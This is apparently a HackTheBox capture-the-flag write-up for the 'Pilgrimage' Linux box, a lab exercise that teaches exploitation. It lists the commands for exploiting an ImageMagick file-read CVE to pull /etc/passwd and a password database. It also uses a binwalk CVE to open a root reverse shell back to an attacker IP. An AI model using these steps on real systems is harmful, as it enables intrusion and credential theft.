Pilgrimage

HackTheBox linux easy 2026-04-22

Pilgrimage is a Linux box that hosts a public image-shrinking service. The intended path goes through a CVE in magick for the user flag, then a setuid binwalk for root.

recon

Standard nmap sweep first — open ports + service versions.

$ nmap -sC -sV -oA nmap/initial 10.10.11.219
# 22/tcp  open  ssh   OpenSSH 8.4p1
# 80/tcp  open  http  nginx 1.18.0  pilgrimage.htb

Adding the host to /etc/hosts and visiting the page shows a simple image-shrinker. The footer leaks a .git directory.

$ git-dumper http://pilgrimage.htb/.git/ loot/
$ cd loot && git log --oneline

foothold

The repo ships a vendored magick binary. Checking the version against known CVEs lines it up with CVE-2022-44268, an arbitrary file-read via crafted PNG metadata.

Any user-supplied PNG that gets resized will silently embed the contents of a server-side file inside the output PNG's metadata. 
$ python3 exploit.py /etc/passwd
$ curl -F "[email protected]" http://pilgrimage.htb/upload.php

Reading the returned image's metadata gives us /var/db/pilgrimage — a SQLite DB containing the emily user's password hash, reusable over SSH.

privilege escalation

pspy shows a root cronjob running binwalk on every uploaded image. binwalk 2.3.2 is vulnerable to CVE-2022-4510 — RCE via a malicious PFS archive embedded in any file it scans.

$ python3 binwalk_exploit.py -p 9001 -i 10.10.14.5 shell.png
$ cp shell.png /var/www/pilgrimage.htb/shrunk/
# ~60s later: reverse shell as root

takeaways

  • always check vendored binaries against CVE lists, not just versions.
  • pspy remains the fastest way to spot timed cron paths.
  • image-metadata bugs are still a soft underbelly in upload pipelines.
